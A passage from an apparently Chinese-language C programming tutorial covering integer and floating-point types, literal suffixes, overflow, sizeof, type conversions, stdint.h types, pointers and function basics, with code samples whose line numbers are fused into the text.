char。这一点与int不同，int就是等同于signed int。 整数的子类型如果int类型使用4个或8个字节表示一个整数，对于小整数，这样做很浪费空间。另一方面，某些场合需要更大的整数，8个字节还不够。为了解决这些问题，C 语言在int类型之外，又提供了三个整数的子类型。这样有利于更精细地限定整数变量的范围，也有利于更好地表达代码的意图。 short int（简写为short）：占用空间不多于int，一般占用2个字节（整数范围为-32768～32767)。 long int（简写为long）：占用空间不少于int，至少为4个字节。 long long int（简写为long long）：占用空间多于long，至少为8个字节。 123short int a;long int b;long long int c; 上面代码分别声明了三种整数子类型的变量。 默认情况下，short、long、long long都是带符号的（signed），即signed关键字省略了。它们也可以声明为不带符号（unsigned），使得能够表示的最大值扩大一倍。 123unsigned short int a;unsigned long int b;unsigned long long int c; C 语言允许省略int，所以变量声明语句也可以写成下面这样。 12345678short a;unsigned short a;long b;unsigned long b;long long c;unsigned long long c; 不同的计算机，数据类型的字节长度是不一样的。确实需要32位整数时，应使用long类型而不是int类型，可以确保不少于4个字节；确实需要64位的整数时，应该使用long long类型，可以确保不少于8个字节。另一方面，为了节省空间，只需要16位整数时，应使用short类型；需要8位整数时，应该使用char类型。 整数类型的极限值有时候需要查看，当前系统不同整数类型的最大值和最小值，C 语言的头文件limits.h提供了相应的常量，比如SCHAR_MIN代表 signed char 类型的最小值-128，SCHAR_MAX代表 signed char 类型的最大值127。 为了代码的可移植性，需要知道某种整数类型的极限值时，应该尽量使用这些常量。 SCHAR_MIN，SCHAR_MAX：signed char 的最小值和最大值。 SHRT_MIN，SHRT_MAX：short 的最小值和最大值。 INT_MIN，INT_MAX：int 的最小值和最大值。 LONG_MIN，LONG_MAX：long 的最小值和最大值。 LLONG_MIN，LLONG_MAX：long long 的最小值和最大值。 UCHAR_MAX：unsigned char 的最大值。 USHRT_MAX：unsigned short 的最大值。 UINT_MAX：unsigned int 的最大值。 ULONG_MAX：unsigned long 的最大值。 ULLONG_MAX：unsigned long long 的最大值。 整数的进制C 语言的整数默认都是十进制数，如果要表示八进制数和十六进制数，必须使用专门的表示法。 八进制使用0作为前缀，比如017、0377。 1int a = 012; // 八进制，相当于十进制的10 十六进制使用0x或0X作为前缀，比如0xf、0X10。 1int a = 0x1A2B; // 十六进制，相当于十进制的6699 有些编译器使用0b前缀，表示二进制数，但不是标准。 1int x = 0b101010; 注意，不同的进制只是整数的书写方法，不会对整数的实际存储方式产生影响。所有整数都是二进制形式存储，跟书写方式无关。不同进制可以混合使用，比如10 + 015 + 0x20是一个合法的表达式。 printf()的进制相关占位符如下。 %d：十进制整数。 %o：八进制整数。 %x：十六进制整数。 %#o：显示前缀0的八进制整数。 %#x：显示前缀0x的十六进制整数。 %#X：显示前缀0X的十六进制整数。 1234567int x = 100;printf(&quot;dec = %d\\n&quot;, x); // 100printf(&quot;octal = %o\\n&quot;, x); // 144printf(&quot;hex = %x\\n&quot;, x); // 64printf(&quot;octal = %#o\\n&quot;, x); // 0144printf(&quot;hex = %#x\\n&quot;, x); // 0x64printf(&quot;hex = %#X\\n&quot;, x); // 0X64 浮点数类型任何有小数点的数值，都会被编译器解释为浮点数。所谓“浮点数”就是使用 m * be 的形式，存储一个数值，m是小数部分，b是基数（通常是2），e是指数部分。这种形式是精度和数值范围的一种结合，可以表示非常大或者非常小的数。 浮点数的类型声明使用float关键字，可以用来声明浮点数变量。 1float c = 10.5; 上面示例中，变量c的就是浮点数类型。 float类型占用4个字节（32位），其中8位存放指数的值和符号，剩下24位存放小数的值和符号。float类型至少能够提供（十进制的）6位有效数字，指数部分的范围为（十进制的）-37到37，即数值范围为10-37到1037。 有时候，32位浮点数提供的精度或者数值范围还不够，C 语言又提供了另外两种更大的浮点数类型。 double：占用8个字节（64位），至少提供13位有效数字。 long double：通常占用16个字节。 注意，由于存在精度限制，浮点数只是一个近似值，它的计算是不精确的，比如 C 语言里面0.1 + 0.2并不等于0.3，而是有一个很小的误差。 1if (0.1 + 0.2 == 0.3) // false C 语言允许使用科学计数法表示浮点数，使用字母e来分隔小数部分和指数部分。 123double x = 123.456e+3; // 123.456 x 10^3// 等同于double x = 123.456e3; 上面示例中，e后面如果是加号+，加号可以省略。注意，科学计数法里面e的前后，不能存在空格。 另外，科学计数法的小数部分如果是0.x或x.0的形式，那么0可以省略。 12345670.3E6// 等同于.3E63.0E6// 等同于3.E6 布尔类型C 语言原来并没有为布尔值单独设置一个类型，而是使用整数0表示伪，所有非零值表示真。 1234int x = 1;if (x) { printf(&quot;x is true!\\n&quot;);} 上面示例中，变量x等于1，C 语言就认为这个值代表真，从而会执行判断体内部的代码。 C99 标准添加了类型_Bool，表示布尔值。但是，这个类型其实只是整数类型的别名，还是使用0表示伪，1表示真，下面是一个示例。 12345_Bool isNormal;isNormal = 1;if (isNormal) printf(&quot;Everything is OK.\\n&quot;); 头文件stdbool.h定义了另一个类型别名bool，并且定义了true代表1、false代表0。只要加载这个头文件，就可以使用这几个关键字。 123#include &lt;stdbool.h&gt;bool flag = false; 上面示例中，加载头文件stdbool.h以后，就可以使用bool定义布尔值类型，以及false和true表示真伪。 字面量的类型字面量（literal）指的是代码里面直接出现的值。 1int x = 123; 上面代码中，x是变量，123就是字面量。 编译时，字面量也会写入内存，因此编译器必须为字面量指定数据类型，就像必须为变量指定数据类型一样。 一般情况下，十进制整数字面量（比如123）会被编译器指定为int类型。如果一个数值比较大，超出了int能够表示的范围，编译器会将其指定为long int。如果数值超过了long int，会被指定为unsigned long。如果还不够大，就指定为long long或unsigned long long。 小数（比如3.14）会被指定为double类型。 字面量后缀有时候，程序员希望为字面量指定一个不同的类型。比如，编译器将一个整数字面量指定为int类型，但是程序员希望将其指定为long类型，这时可以为该字面量加上后缀l或L，编译器就知道要把这个字面量的类型指定为long。 1int x = 123L; 上面代码中，字面量123有后缀L，编译器就会将其指定为long类型。这里123L写成123l，效果也是一样的，但是建议优先使用L，因为小写的l容易跟数字1混淆。 八进制和十六进制的值，也可以使用后缀l和L指定为 Long 类型，比如020L和0x20L。 12int y = 0377L;int z = 0x7fffL; 如果希望指定为无符号整数unsigned int，可以使用后缀u或U。 1int x = 123U; L和U可以结合使用，表示unsigned long类型。L和U的大小写和组合顺序无所谓。 1int x = 123LU; 对于浮点数，编译器默认指定为 double 类型，如果希望指定为其他类型，需要在小数后面添加后缀f（float）或l（long double）。 科学计数法也可以使用后缀。 121.2345e+10F1.2345e+10L 总结一下，常用的字面量后缀有下面这些。 f和F：float类型。 l和L：对于整数是long int类型，对于小数是long double类型。 ll和LL：Long Long 类型，比如3LL。 u和U：表示unsigned int，比如15U、0377U。 u还可以与其他整数后缀结合，放在前面或后面都可以，比如10UL、10ULL和10LLU都是合法的。 下面是一些示例。 1234567891011int x = 1234;long int x = 1234L;long long int x = 1234LLunsigned int x = 1234U;unsigned long int x = 1234UL;unsigned long long int x = 1234ULL;float x = 3.14f;double x = 3.14;long double x = 3.14L; 溢出每一种数据类型都有数值范围，如果存放的数值超出了这个范围（小于最小值或大于最大值），需要更多的二进制位存储，就会发生溢出。大于最大值，叫做向上溢出（overflow）；小于最小值，叫做向下溢出（underflow）。 一般来说，编译器不会对溢出报错，会正常执行代码，但是会忽略多出来的二进制位，只保留剩下的位，这样往往会得到意想不到的结果。所以，应该避免溢出。 1234unsigned char x = 255;x = x + 1;printf(&quot;%d\\n&quot;, x); // 0 上面示例中，变量x加1，得到的结果不是256，而是0。因为x是unsign char类型，最大值是255（二进制11111111），加1后就发生了溢出，256（二进制100000000）的最高位1被丢弃，剩下的值就是0。 再看下面的例子。 12345unsigned int ui = UINT_MAX; // 4,294,967,295ui++;printf(&quot;ui = %u\\n&quot;, ui); // 0ui--;printf(&quot;ui = %u\\n&quot;, ui); // 4,294,967,295 上面示例中，常量UINT_MAX是 unsigned int 类型的最大值。如果加1，对于该类型就会溢出，从而得到0；而0是该类型的最小值，再减1，又会得到UINT_MAX。 溢出很容易被忽视，编译器又不会报错，所以必须非常小心。 1for (unsigned int i = n; i &gt;= 0; --i) // 错误 上面代码表面看似乎没有问题，但是循环变量i的类型是 unsigned int，这个类型的最小值是0，不可能得到小于0的结果。当i等于0，再减去1的时候，并不会返回-1，而是返回 unsigned int 的类型最大值，这个值总是大于等于0，导致无限循环。 为了避免溢出，最好方法就是将运算结果与类型的极限值进行比较。 12345678910unsigned int ui;unsigned int sum;// 错误if (sum + ui &gt; UINT_MAX) too_big();else sum = sum + ui;// 正确if (ui &gt; UINT_MAX - sum) too_big();else sum = sum + ui; 上面示例中，变量sum和ui都是 unsigned int 类型，它们相加的和还是 unsigned int 类型，这就有可能发生溢出。但是，不能通过相加的和是否超出了最大值UINT_MAX，来判断是否发生了溢出，因为sum + ui总是返回溢出后的结果，不可能大于UINT_MAX。正确的比较方法是，判断UINT_MAX - sum与ui之间的大小关系。 下面是另一种错误的写法。 1234567unsigned int i = 5;unsigned int j = 7;if (i - j &lt; 0) // 错误 printf(&quot;negative\\n&quot;);else printf(&quot;positive\\n&quot;); 上面示例的运算结果，会输出positive。原因是变量i和j都是 unsigned int 类型，i - j的结果也是这个类型，最小值为0，不可能得到小于0的结果。正确的写法是写成下面这样。 1if (j &gt; i) // .... sizeof 运算符sizeof是 C 语言提供的一个运算符，返回某种数据类型或某个值占用的字节数量。它的参数可以是数据类型的关键字，也可以是变量名或某个具体的值。 123456789// 参数为数据类型int x = sizeof(int);// 参数为变量int i;sizeof(i);// 参数为数值sizeof(3.14); 上面的第一个示例，返回得到int类型占用的字节数量（通常是4或8）。第二个示例返回整数变量占用字节数量，结果与前一个示例完全一样。第三个示例返回浮点数3.14占用的字节数量，由于浮点数的字面量一律存储为 double 类型，所以会返回8，因为 double 类型占用的8个字节。 sizeof运算符的返回值，C 语言只规定是无符号整数，并没有规定具体的类型，而是留给系统自己去决定，sizeof到底返回什么类型。不同的系统中，返回值的类型有可能是unsigned int，也有可能是unsigned long，甚至是unsigned long long，对应的printf()占位符分别是%u、%lu和%llu。这样不利于程序的可移植性。 C 语言提供了一个解决方法，创造了一个类型别名size_t，用来统一表示sizeof的返回值类型。该别名定义在stddef.h头文件（引入stdio.h时会自动引入）里面，对应当前系统的sizeof的返回值类型，可能是unsigned int，也可能是unsigned long。 C 语言还提供了一个常量SIZE_MAX，表示size_t可以表示的最大整数。所以，size_t能够表示的整数范围为[0, SIZE_MAX]。 printf()有专门的占位符%zd或%zu，用来处理size_t类型的值。 1printf(&quot;%zd\\n&quot;, sizeof(int)); 上面代码中，不管sizeof返回值的类型是什么，%zd占位符（或%zu）都可以正确输出。 如果当前系统不支持%zd或%zu，可使用%u（unsigned int）或%lu（unsigned long int）代替。 类型的自动转换某些情况下，C 语言会自动转换某个值的类型。 赋值运算赋值运算符会自动将右边的值，转成左边变量的类型。 （1）浮点数赋值给整数变量 浮点数赋予整数变量时，C 语言直接丢弃小数部分，而不是四舍五入。 1int x = 3.14; 上面示例中，变量x是整数类型，赋给它的值是一个浮点数。编译器会自动把3.14先转为int类型，丢弃小数部分，再赋值给x，因此x的值是3。 这种自动转换会导致部分数据的丢失（3.14丢失了小数部分），所以最好不要跨类型赋值，尽量保证变量与所要赋予的值是同一个类型。 注意，舍弃小数部分时，不是四舍五入，而是整个舍弃。 1int x = 12.99; 上面示例中，x等于12，而不是四舍五入的13。 （2）整数赋值给浮点数变量 整数赋值给浮点数变量时，会自动转为浮点数。 1float y = 12 * 2; 上面示例中，变量y的值不是24，而是24.0，因为等号右边的整数自动转为了浮点数。 （3）窄类型赋值给宽类型 字节宽度较小的整数类型，赋值给字节宽度较大的整数变量时，会发生类型提升，即窄类型自动转为宽类型。 比如，char或short类型赋值给int类型，会自动提升为int。 12char x = 10;int i = x + y; 上面示例中，变量x的类型是char，由于赋值给int类型，所以会自动提升为int。 （4）宽类型赋值给窄类型 字节宽度较大的类型，赋值给字节宽度较小的变量时，会发生类型降级，自动转为后者的类型。这时可能会发生截值（truncation），系统会自动截去多余的二进制位，导致难以预料的结果。 12int i = 321;char ch = i; // ch 的值是 65 （321 - 256） 上面例子中，变量ch是char类型，宽度是8个二进制位。变量i是int类型，将i赋值给ch，后者只能容纳i（二进制形式为101000001，共9位）的后八位，前面多出来的二进制位被丢弃，保留后八位就变成了01000001（十进制的65，相当于字符A）。 浮点数赋值给整数类型的值，也会发生截值，浮点数的小数部分会被截去。 12double pi = 3.14159;int i = pi; // i 的值为 3 上面示例中，i等于3，pi的小数部分被截去了。 混合类型的运算不同类型的值进行混合计算时，必须先转成同一个类型，才能进行计算。转换规则如下： （1）整数与浮点数混合运算时，整数转为浮点数类型，与另一个运算数类型相同。 13 + 1.2 // 4.2 上面示例是int类型与float类型的混合计算，int类型的3会先转成float的3.0，再进行计算，得到4.2。 （2）不同的浮点数类型混合运算时，宽度较小的类型转为宽度较大的类型，比如float转为double，double转为long double。 （3）不同的整数类型混合运算时，宽度较小的类型会提升为宽度较大的类型。比如short转为int，int转为long等，有时还会将带符号的类型signed转为无符号unsigned。 下面例子的执行结果，可能会出人意料。 123int a = -5;if (a &lt; sizeof(int)） do_something(); 上面示例中，变量a是带符号整数，sizeof(int)是size_t类型，这是一个无符号整数。按照规则，signed int 自动转为 unsigned int，所以a会自动转成无符号整数4294967291（转换规则是-5加上无符号整数的最大值，再加1），导致比较失败，do_something()不会执行。 所以，最好避免无符号整数与有符号整数的混合运算。因为这时 C 语言会自动将signed int转为unsigned int，可能不会得到预期的结果。 整数类型的运算两个相同类型的整数运算时，或者单个整数的运算，一般来说，运算结果也属于同一类型。但是有一个例外，宽度小于int的类型，运算结果会自动提升为int。 1234unsigned char a = 66;if ((-a) &lt; 0) printf(&quot;negative\\n&quot;);else printf(&quot;positive\\n&quot;); 上面示例中，变量a是 unsigned char 类型，这个类型不可能小于0，但是-a不是 unsigned char 类型，会自动转为 int 类型，导致上面的代码输出 negative。 再看下面的例子。 123456unsigned char a = 1;unsigned char b = 255;unsigned char c = 255;if ((a - 5) &lt; 0) do_something();if ((b + c) &gt; 300) do_something(); 上面示例中，表达式a - 5和b + c都会自动转为 int 类型，所以函数do_something()会执行两次。 函数函数的参数和返回值，会自动转成函数定义里指定的类型。 12345int dostuff(int, unsigned char);char m = 42;unsigned short n = 43;long long int c = dostuff(m, n); 上面示例中，参数变量m和n不管原来的类型是什么，都会转成函数dostuff()定义的参数类型。 下面是返回值自动转换类型的例子。 1234char func(void) { int a = 42; return a;} 上面示例中，函数内部的变量a是int类型，但是返回的值是char类型，因为函数定义中返回的是这个类型。 类型的显式转换原则上，应该避免类型的自动转换，防止出现意料之外的结果。C 语言提供了类型的显式转换，允许手动转换类型。 只要在一个值或变量的前面，使用圆括号指定类型(type)，就可以将这个值或变量转为指定的类型，这叫做“类型指定”（casting）。 1(unsigned char) ch 上面示例将变量ch转成无符号的字符类型。 1long int y = (long int) 10 + 12; 上面示例中，(long int)将10显式转为long int类型。这里的显示转换其实是不必要的，因为赋值运算符会自动将右边的值，转为左边变量的类型。 可移植类型C 语言的整数类型（short、int、long）在不同计算机上，占用的字节宽度可能是不一样的，无法提前知道它们到底占用多少个字节。 程序员有时控制准确的字节宽度，这样的话，代码可以有更好的可移植性，头文件stdint.h创造了一些新的类型别名。 （1）精确宽度类型(exact-width integer type)，保证某个整数类型的宽度是确定的。 int8_t：8位有符号整数。 int16_t：16位有符号整数。 int32_t：32位有符号整数。 int64_t：64位有符号整数。 uint8_t：8位无符号整数。 uint16_t：16位无符号整数。 uint32_t：32位无符号整数。 uint64_t：64位无符号整数。 上面这些都是类型别名，编译器会指定它们指向的底层类型。比如，某个系统中，如果int类型为32位，int32_t就会指向int；如果long类型为32位，int32_t则会指向long。 下面是一个使用示例。 12345678#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;int main(void) { int32_t x32 = 45933945; printf(&quot;x32 = %d\\n&quot;, x32); return 0;} 上面示例中，变量x32声明为int32_t类型，可以保证是32位的宽度。 （2）最小宽度类型（minimum width type），保证某个整数类型的最小长度。 int_least8_t int_least16_t int_least32_t int_least64_t uint_least8_t uint_least16_t uint_least32_t uint_least64_t 上面这些类型，可以保证占据的字节不少于指定宽度。比如，int_least8_t表示可以容纳8位有符号整数的最小宽度的类型。 （3）最快的最小宽度类型（fast minimum width type），可以使整数计算达到最快的类型。 int_fast8_t int_fast16_t int_fast32_t int_fast64_t uint_fast8_t uint_fast16_t uint_fast32_t uint_fast64_t 上面这些类型是保证字节宽度的同时，追求最快的运算速度，比如int_fast8_t表示对于8位有符号整数，运算速度最快的类型。这是因为某些机器对于特定宽度的数据，运算速度最快，举例来说，32位计算机对于32位数据的运算速度，会快于16位数据。 （4）可以保存指针的整数类型。 intptr_t：可以存储指针（内存地址）的有符号整数类型。 uintptr_t：可以存储指针的无符号整数类型。 （5）最大宽度整数类型，用于存放最大的整数。 intmax_t：可以存储任何有效的有符号整数的类型。 uintmax_t：可以存放任何有效的无符号整数的类型。 上面的这两个类型的宽度比long long和unsigned long更大。 指针指针是 C 语言最重要的概念之一，也是最难理解的概念之一。 简介指针是什么？首先，它是一个值，这个值代表一个内存地址，因此指针相当于指向某个内存地址的路标。 字符*表示指针，通常跟在类型关键字的后面，表示指针指向的是什么类型的值。比如，char*表示一个指向字符的指针，float*表示一个指向float类型的值的指针。 1int* intPtr; 上面示例声明了一个变量intPtr，它是一个指针，指向的内存地址存放的是一个整数。 星号*可以放在变量名与类型关键字之间的任何地方，下面的写法都是有效的。 123int *intPtr;int * intPtr;int* intPtr; 本书使用星号紧跟在类型关键字后面的写法（即int* intPtr;），因为这样可以体现，指针变量就是一个普通变量，只不过它的值是内存地址而已。 这种写法有一个地方需要注意，如果同一行声明两个指针变量，那么需要写成下面这样。 12345// 正确int * foo, * bar;// 错误int* foo, bar; 上面示例中，第二行的执行结果是，foo是整数指针变量，而bar是整数变量，即*只对第一个变量生效。 一个指针指向的可能还是指针，这时就要用两个星号**表示。 1int** foo; 上面示例表示变量foo是一个指针，指向的还是一个指针，第二个指针指向的则是一个整数。 * 运算符*这个符号除了表示指针以外，还可以作为运算符，用来取出指针变量所指向的内存地址里面的值。 123void increment(int* p) { *p = *p + 1;} 上面示例中，函数increment()的参数是一个整数指针p。函数体里面，*p就表示指针p所指向的那个值。对*p赋值，就表示改变指针所指向的那个地址里面的值。 上面函数的作用是将参数值加1。该函数没有返回值，因为传入的是地址，函数体内部对该地址包含的值的操作，会影响到函数外部，所以不需要返回值。事实上，函数内部通过指针，将值传到外部，是 C 语言的常用方法。 变量地址而不是变量值传入函数，还有一个好处。对于需要大量存储空间的大型变量，复制变量值传入函数，非常浪费时间和空间，不如传入指针来得高效。 &amp; 运算符&amp;运算符用来取出一个变量所在的内存地址。 12int x = 1;printf(&quot;x's address is %p\\n&quot;, &amp;x); 上面示例中，x是一个整数变量，&amp;x就是x的值所在的内存地址。printf()的%p是内存地址的占位符，可以打印出内存地址。 上一小节中，参数变量加1的函数，可以像下面这样使用。 1234567void increment(int* p) { *p = *p + 1;}int x = 1;increment(&amp;x);printf(&quot;%d\\n&quot;, x); // 2 上面示例中，调用increment()函数以后，变量x的值就增加了1，原因就在于传入函数的是变量x的地址&amp;x。 &amp;运算符与*运算符互为逆运算，下面的表达式总是成立。 123int i = 5;if (i == *(&amp;i)) // 正确 指针变量的初始化声明指针变量之后，编译器会为指针变量本身分配一个内存空间，但是这个内存空间里面的值是随机的，也就是说，指针变量指向的值是随机的。这时一定不能去读写指针变量指向的地址，因为那个地址是随机地址，很可能会导致严重后果。 12int* p;*p = 1; // 错误 上面的代码是错的，因为p指向的那个地址是随机的，向这个随机地址里面写入1，会导致意想不到的结果。 正确做法是指针变量声明后，必须先让它指向一个分配好的地址，然后再进行读写，这叫做指针变量的初始化。 12345int* p;int i;p = &amp;i;*p = 13; 上面示例中，p是指针变量，声明这个变量后，p会指向一个随机的内存地址。这时要将它指向一个已经分配好的内存地址，上例就是再声明一个整数变量i，编译器会为i分配内存地址，然后让p指向i的内存地址（p = &amp;i;）。完成初始化之后，就可以对p指向的内存地址进行赋值了（*p = 13;）。 为了防止读写未初始化的指针变量，可以养成习惯，将未初始化的指针变量设为NULL。 1int* p = NULL; NULL在 C 语言中是一个常量，表示地址为0的内存空间，这个地址是无法使用的，读写该地址会报错。 指针的运算指针本质上就是一个无符号整数，代表了内存地址。它可以进行运算，但是规则并不是整数运算的运算。 （1）指针与整数值的加减运算 指针与整数值的运算，表示指针的移动。 123short* j;j = (short*)0x1234;j = j + 1; // 0x1236 上面示例中，j是一个指针，指向内存地址0x1234。你可能以为j + 1等于0x1235，但正确答案是0x1236。原因是j + 1表示指针向高位移动一个单位，而一个单位的short类型占据两个字节的宽度，所以相当于向高位移动两个字节。同样的，j - 1得到的结果是0x1232。 指针移动的单位，与指针指向的数据类型有关。数据类型占据多少个字节，每单位就移动多少个字节。 （2）指针与指针的加法运算 指针只能与整数值进行加减运算，两个指针进行加法是非法的。 123unsigned short* j;unsigned short* k;x = j + k; // 非法 上面示例是两个指针相加，这是非法的。 （3）指针与指针的减法 相同类型的指针允许进行减法运算，返回它们之间的距离，即相隔多少个数据单位。 高位地址减去低位地址，返回的是正值；低位地址减去高位地址，返回的是负值。 这时，减法返回的值属于ptrdiff_t类型，这是一个带符号的整数类型别名，具体类型根据系统不同而不同。这个类型的原型定义在头文件stddef.h里面。 12345678short* j1;short* j2;j1 = (short*)0x1234;j2 = (short*)0x1236;ptrdiff_t dist = j2 - j1;printf(&quot;%d\\n&quot;, dist); // 1 上面示例中，j1和j2是两个指向 short 类型的指针，变量dist是它们之间的距离，类型为ptrdiff_t，值为1，因为相差2个字节正好存放一个 short 类型的值。 （4）指针与指针的比较运算 指针之间的比较运算，比较的是各自的内存地址哪一个更大，返回值是整数1（true）或0（false）。 函数简介函数是一段可以重复执行的代码。它可以接受不同的参数，完成对应的操作。下面的例子就是一个函数。 123int plus_one(int n) { return n + 1;} 上面的代码声明了一个函数plus_one()。 函数声明的语法有以下几点，需要注意。 （1）返回值类型。函数声明时，首先需要给出返回值的类型，上例是int，表示函数plus_one()返回一个整数。 （2）参数。函数名后面的圆括号里面，需要声明参数的类型和参数名，plus_one(int n)表示这个函数有一个整数参数n。 （3）函数体。函数体要写在大括号里面，后面（即大括号外面）不需要加分号。大括号的起始位置，可以跟函数名在同一行，也可以另起一行，本书采用同一行的写法。 （4）return语句。return语句给出函数的返回值，程序运行到这一行，就会跳出函数体，结束函数的调用。如果函数没有返回值，可以省略return语句，或者写成return;。 调用函数时，只要在函数名后面加上圆括号就可以了，实际的参数放在圆括号里面，就像下面这样。 12int a = plus_one(13);// a 等于 14 函数调用时，参数个数必须与定义里面的参数个数一致，参数过多或过少都会报错。 123456int plus_one(int n) { return n + 1;}plus_one(2, 2); // 报错plus_one(); // 报错 上面示例中，函数plus_one()只能接受一个参数，传入两个参数或不传参数，都会报错。 函数必须声明后使用，否则会报错。也就是说，一定要在使用plus_one()之前，声明这个函数。如果像下面这样写，编译时会报错。 12345int a = plus_one(13);int plus_one(int n) { return n + 1;} 上面示例中，在调用plus_one()之后，才声明这个函数，编译就会报错。 C 语言标准规定，函数只能声明在源码文件的顶层，不能声明在其他函数内部。 不返回值的函数，使用void关键字表示返回值的类型。没有参数的函数，声明时要用void关键字表示参数类型。 123void myFunc(void) { // ...} 上面的myFunc()函数，既没有返回值，调用时也不需要参数。 函数可以调用自身，这就叫做递归（recursion）。下面是斐波那契数列的例子。 123456unsigned long Fibonacci(unsigned n) { if (n &gt; 2) return Fibonacci(n - 1) + Fibonacci(n - 2); else return 1;} 上面示例中，函数Fibonacci()调用了自身，大大简化了算法。 main()C 语言规定，main()是程序的入口函数，即所有的程序一定要包含一个main()函数。程序总是从这个函数开始执行，如果没有该函数，程序就无法启动。其他函数都是通过它引入程序的。 main()的写法与其他函数一样，要给出返回值的类型和参数的类型，就像下面这样。 1234int main(void) { printf(&quot;Hello World\\n&quot;); return 0;} 上面示例中，最后的return 0;表示函数结束运行，返回0。 C 语言约定，返回值0表示函数运行成功，如果返回其他非零整数，就表示运行失败，代码出了问题。系统根据main()的返回值，作为整个程序的返回值，确定程序是否运行成功。 正常情况下，如果main()里面省略return 0这一行，编译器会自动加上，即main()的默认返回值为0。所以，写成下面这样，效果完全一样。 123int main(void) { printf(&quot;Hello World\\n&quot;);} 由于 C 语言只会对main()函数默认添加返回值，对其他函数不会这样做，所以建议总是保留return语句，以便形成统一的代码风格。 参数的传值引用如果函数的参数是一个变量，那么调用时，传入的是这个变量的值的拷贝，而不是变量本身。 12345678void increment(int a) { a++;}int i = 10;increment(i);printf(&quot;%d\\n&quot;, i); // 10 上面示例中，调用increment(i)以后，变量i本身不会发生变化，还是等于10。因为传入函数的是i的拷贝，而不是i本身，拷贝的变化，影响不到原始变量。这就叫做“传值引用”。 所以，如果参数变量发生变化，最好把它作为返回值传出来。 123456789int increment(int a) { a++; return a;}int i = 10;i = increment(i);printf(&quot;%d\\n&quot;, i); // 11 再看下面的例子，Swap()函数用来交换两个变量的值，由于传值引用，下面的写法不会生效。 12345678910void Swap(int x, int y) { int temp; temp = x; x = y; y = temp;}int a = 1;int b = 2;Swap(a, b); // 无效 上面的写法不会产生交换变量值的效果，因为传入的变量是原始变量a和b的拷贝，不管函数内部怎么操作，都影响不了原始变量。 如果想要传入变量本身，只有一个办法，就是传入变量的地址。 12345678910void Swap(int* x, int* y) { int temp; temp = *x; *x = *y; *y = temp;}int a = 1;int b = 2;Swap(&amp;a, &amp;b); 上面示例中，通过传入变量x和y的地址，函数内部就可以直接操作该地址，从而实现交换两个变量的值。 虽然跟传参无关，这里特别提一下，函数不要返回内部变量的指针。 12345int* f(void) { int i; // ... return &amp;i;} 上面示例中，函数返回内部变量i的指针，这种写法是错的。因为当函数结束运行时，内部变量就消失了，这时指向内部变量i的内存地址就是无效的，再去使用这个地址是非常危险的。 函数指针函数本身就是一段内存里面的代码，C 语言允许通过指针获取函数。 12345void print(int a) { printf(&quot;%d\\n&quot;, a);}void (*print_ptr)(int) = &amp;print; 上面示例中，变量print_ptr是一个函数指针，它指向函数print()的地址。函数print()的地址可以用&amp;print获得。注意，(*print_ptr)一定要写在圆括号里面，否则函数参数(int)的优先级高于*，整个式子就会变成void* print_ptr(int)。 有了函数指针，通过它也可以调用函数。 123(*print_ptr)(10);// 等同于print(10); 比较特殊的是，C 语言还规定，函数名本身就是指向函数代码的指针，通过函数名就能获取函数地址。也就是说，print和&amp;print是一回事。 1if (print == &amp;print) // true 因此，上面代码的print_ptr等同于print。 12345void (*print_ptr)(int) = &amp;print;// 或void (*print_ptr)(int) = print;if (print_ptr == print) // true 所以，对于任意函数，都有五种调用函数的写法。 1234567891011121314// 写法一print(10)// 写法二(*print)(10)// 写法三(&amp;print)(10)// 写法四(*print_ptr)(10)// 写法五print_ptr(10) 为了简洁易读，一般情况下，函数名前面都不加*和&amp;。 这种特性的一个应用是，如果一个函数的参数或返回值，也是一个函数，那么函数原型可以写成下面这样。 1int compute(int (*myfunc)(int), int, int); 上面示例可以清晰地表明，函数compute()的第一个参数也是一个函数。 函数原型前面说过，函数必须先声明，后使用。由于程序总是先运行main()函数，导致所有其他函数都必须在main()函数之前声明。 1234567891011void func1(void) {}void func2(void) {}int main(void) { func1(); func2(); return 0;} 上面代码中，main()函数必须在最后声明，否则编译时会产生警告，找不到func1()或func2()的声明。 但是，main()是整个程序的入口，也是主要逻辑，放在最前面比较好。另一方面，对于函数较多的程序，保证每个函数的顺序正确，会变得很麻烦。 C 语言提供的解决方法是，只要在程序开头处给出函数原型，函数就可以先使用、后声明。所谓函数原型，就是提前告诉编译器，每个函数的返回类型和参数类型。其他信息都不需要，也不用包括函数体，具体的函数实现可以后面再补上。 123456789int twice(int);int main(int num) { return twice(num);}int twice(int num) { return 2 * num;} 上面示例中，函数twice()的实现是放在main()后面，但是代码头部先给出了函数原型，所以可以正确编译。只要提前给出函数原型，函数具体的实现放在哪里，就不重要了。 函数原型包括参数名也可以，虽然这样对于编译器是多余的，但是阅读代码的时候，可能有助于理解函数的意图。 1234int twice(int);// 等同于int twice(int num); 上面示例中，twice函数的参数名num，无论是否出现在原型里面，都是可以的。 注意，函数原型必须以分号结尾。 一般来说，每个源码文件的头部，都会给出当前脚本使用的所有函数的原型。 exit()exit()函数用来终止整个程序的运行。一旦执行到该函数，程序就会立即结束。该函数的原型定义在头文件stdlib.h里面。 exit()可以向程序外部返回一个值，它的参数就是程序的返回值。一般来说，使用两个常量作为它的参数：EXIT_SUCCESS（相当于 0）表示程序运行成功，EXIT_FAILURE（相当于 1）表示程序异常中止。这两个常数也是定义在stdlib.h里面。 1234567// 程序运行成功// 等同于 exit(0);exit(EXIT_SUCCESS);// 程序异常中止// 等同于 exit(1);exit(EXIT_FAILURE); 在main()函数里面，exit()等价于使用return语句。其他函数使用exit()，就是终止整个程序的运行，没有其他作用。 C 语言还提供了一个atexit()函数，用来登记exit()执行时额外执行的函数，用来做一些退出程序时的收尾工作。该函数的原型也是定义在头文件stdlib.h。 1int atexit(void (*func)(void)); atexit()的参数是一个函数指针。注意，它的参数函数（上例的print）不能接受参数，也不能有返回值。 123456void print(void) { printf(&quot;something wrong!\\n&quot;);}atexit(print);exit(EXIT_FAILURE); 上面示例中，exit()执行时会先自动调用atexit()注册的print()函数，然后再终止程序。 函数说明符C 语言提供了一些函数说明符，让函数用法更加明确。 extern 说明符对于多文件的项目，源码文件会用到其他文件声明的函数。这时，当前文件里面，需要给出外部函数的原型，并用extern说明该函数的定义来自其他文件。 1234567extern int foo(int arg1, char arg2);int main(void) { int a = foo(2, 3); // ... return 0;} 上面示例中，函数foo()定义在其他文件，extern告诉编译器当前文件不包含该函数的定义。 不过，由于函数原型默认就是extern，所以这里不加extern，效果是一样的。 static 